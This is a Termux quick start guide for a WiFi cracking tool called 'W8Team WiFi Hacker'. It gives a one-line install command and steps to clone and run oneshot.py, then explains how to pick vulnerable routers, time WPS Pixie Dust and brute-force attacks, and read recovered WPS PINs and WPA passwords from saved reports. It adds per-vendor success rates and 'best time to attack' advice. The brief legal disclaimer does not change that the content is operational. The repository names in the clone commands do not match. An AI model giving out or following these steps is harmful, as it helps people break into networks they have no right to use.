# 📱 W8Team WiFi Hacker - Termux Quick Start Guide

## 🚀 **1-Minute Installation**

```bash
# Copy and paste this entire block:
pkg update && pkg upgrade -y && pkg install -y root-repo && pkg install -y git tsu python wpa-supplicant pixiewps iw openssl python-pip aircrack-ng hashcat && pip install pyfiglet psutil requests && git clone https://github.com/imran6363/W8RootWifiHKV4.git && cd W8RootWifiHKV4 && echo "🎉 Ready to hack! Run: tsu && python oneshot.py"
```

## 📋 **Step-by-Step Installation**

### **Step 1: Install Termux**
- Download Termux from **F-Droid** (NOT Google Play)
- Open Termux and run the following commands

### **Step 2: Update Termux**
```bash
pkg update && pkg upgrade -y
```

### **Step 3: Install Required Packages**
```bash
# Install root repository (for advanced tools)
pkg install -y root-repo

# Install core packages
pkg install -y git tsu python wpa-supplicant pixiewps iw openssl

# Install Python package manager
pkg install -y python-pip

# Install additional WiFi tools
pkg install -y aircrack-ng hashcat

# Install Python dependencies
pip install pyfiglet psutil requests
```

### **Step 4: Clone Repository**
```bash
git clone https://github.com/W8SOJIB/W8RootWifiHKV2
cd W8RootWifiHKV4
```

### **Step 5: Run Installer (Optional)**
```bash
# Optional: Run auto-installer for additional setup
bash termux_install.sh
```

### **Step 6: Start Hacking!**
```bash
tsu
python oneshot.py
```

## 🎮 **Basic Usage**

### **Quick Auto Attack**
```bash
# Get root and run auto attack
tsu
python oneshot.py
# Select option 1 for auto attack
```

### **Manual Target Selection**
```bash
# Run tool and select option 2
python oneshot.py
# Choose from green networks (high vulnerability)
```

## 🔧 **Troubleshooting**

### **Permission Denied**
```bash
# Solution:
tsu
# If tsu doesn't work, try:
pkg install tsu
```

### **No Networks Found**
- Enable WiFi on your device
- Enable location services
- Move closer to WiFi routers
- Restart Termux

### **Python Errors**
```bash
# Reinstall Python packages:
pip install --upgrade pip
pip install pyfiglet psutil requests
```

### **WPA Supplicant Errors**
```bash
# Kill conflicting processes:
pkill wpa_supplicant
pkill dhcpcd
```

## 📱 **Termux-Specific Tips**

### **Storage Permissions**
```bash
# Grant storage access:
termux-setup-storage
```

### **Keep Termux Awake**
- Go to Android Settings → Apps → Termux
- Disable battery optimization
- Allow background activity

### **WiFi Permissions**
- Enable location services on Android
- Grant location permission to Termux
- Keep WiFi enabled during attacks

## 🎯 **Attack Success Tips**

### **Best Targets (Green Networks)**
- Look for green colored networks in menu option 2
- These have highest success probability
- Usually crack within 30-120 seconds

### **Optimal Conditions**
- Strong WiFi signal (close to router)
- No interference from other devices
- Stable internet connection
- Sufficient battery power

### **What to Expect**
- **Pixie Dust**: 30 seconds - 2 minutes
- **AI Prediction**: 2-10 minutes  
- **Brute Force**: 10-60 minutes
- **Auto Attack**: Varies per network

## 📊 **Understanding Output**

### **Network Colors**
- 🟢 **Green**: High vulnerability (recommended)
- 🔴 **Red**: WPS locked (harder)
- 🟡 **Yellow**: Already cracked
- ⚪ **White**: Normal risk

### **Success Messages**
```
[+] ✅ Attack successful in 45.2 seconds!
[+] WPS PIN: '12345670'
[+] WPA PSK: 'MySecretPassword123' 
[+] AP SSID: 'HomeNetwork_5G'
```

### **Progress Tracking**
```
[*] Progress: 15.4% | Session: a7b2c3d4
[*] Speed: 2.3s/pin | Success Rate: 73.2%
[*] ETA: 12.5 min | Attempts: 1,847
```

## 💾 **Finding Your Results**

### **Saved Files Location**
```bash
# View saved passwords:
ls reports/
cat reports/All\ WIFI\ Password\ And\ WPS\ Pin.txt
```

### **Attack History**
```bash
# View attack logs:
cat attack_history.txt
cat auto_attack_results.txt
```

## 📞 **Get Help**

### **Telegram Support**
- Channel: https://t.me/bangladeshcybarforce79
- Direct support from developer
- Community help and tips
- Latest updates and features

### **Common Commands**
```bash
# Check WiFi interface:
ip link show

# Check if tool files exist:
ls -la

# Restart from clean state:
cd ~ && rm -rf W8RootWifiHK && git clone [repo] && cd W8RootWifiHK
```

## ⚖️ **Legal Reminders**

### **✅ Legal Use**
- Your own networks
- Authorized testing
- Educational purposes
- With written permission

### **❌ Illegal Use**
- Neighbor's WiFi
- Public networks
- Commercial networks
- Without permission

**Always follow local laws!**

## 🎉 **Success Stories**

### **Typical Success Rates**
- **D-Link routers**: 85-95%
- **TP-Link routers**: 70-85%
- **Netgear routers**: 60-75%
- **ASUS routers**: 50-70%
- **Linksys routers**: 60-80%

### **Best Time to Attack**
- Late evening (less interference)
- Early morning (stable connections)
- When close to target router
- With strong device battery

---

**🛡️ Happy Ethical Hacking! 🛡️**

*Made with ❤️ by Bangladesh Cyber Force 79

**📱 Join us: https://t.me/bangladeshcybarforce79
